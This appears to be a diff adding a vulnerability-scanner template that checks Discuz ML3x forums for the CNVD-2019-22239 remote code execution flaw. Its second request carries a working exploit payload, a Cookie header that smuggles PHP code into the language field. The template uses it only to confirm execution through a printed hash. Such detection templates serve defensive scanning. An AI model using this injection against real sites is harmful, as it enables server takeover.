@@ -1,0 +1,45 @@
+id: discuz-cnvd-2019-22239
+
+info:
+  name: Discuz Ml3x Remote Code Execution (CNVD-2019-22239)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: discuz,rce,cnvd-2019-22239
+  description: |
+    Discuz ML3x is vulnerable to remote code execution due to improper handling of cookies in the forum.php file.
+
+variables:
+  r1: "{{rand_int(10000, 21000)}}"
+
+http:
+  - id: "initial-request"
+    method: GET
+    path:
+      - "{{BaseURL}}/forum.php"
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        regex:
+          - "cookiepre = '(?P<token>[\\w_]+)'"
+        internal: true
+
+  - id: "verification"
+    method: GET
+    path:
+      - "{{BaseURL}}/forum.php"
+    headers:
+      Cookie: "{{token}}language=sc''.print(md5({{r1}})).''"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(r1)}}"
+        part: body
